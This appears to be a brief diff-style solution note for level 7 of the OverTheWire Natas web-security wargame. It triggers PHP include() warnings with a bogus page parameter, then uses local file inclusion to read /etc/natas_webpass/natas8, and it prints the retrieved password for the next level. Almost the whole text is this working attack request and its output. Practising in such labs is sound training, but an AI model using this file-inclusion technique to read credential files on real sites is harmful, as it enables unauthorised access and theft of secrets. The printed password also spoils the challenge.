@@ -1,0 +1,10 @@
+<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+
+http://natas7.natas.labs.overthewire.org/index.php?page=x
+Warning: include(x): failed to open stream: No such file or directory in
+ /var/www/natas/natas7/index.php on line 13 Warning:
+ include(): Failed opening 'x' for inclusion
+ (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/natas/natas7/index.php on line 13 
+ 
+ http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+ maabkdexUStb6JJXUqmBx7Re8M61cksn 
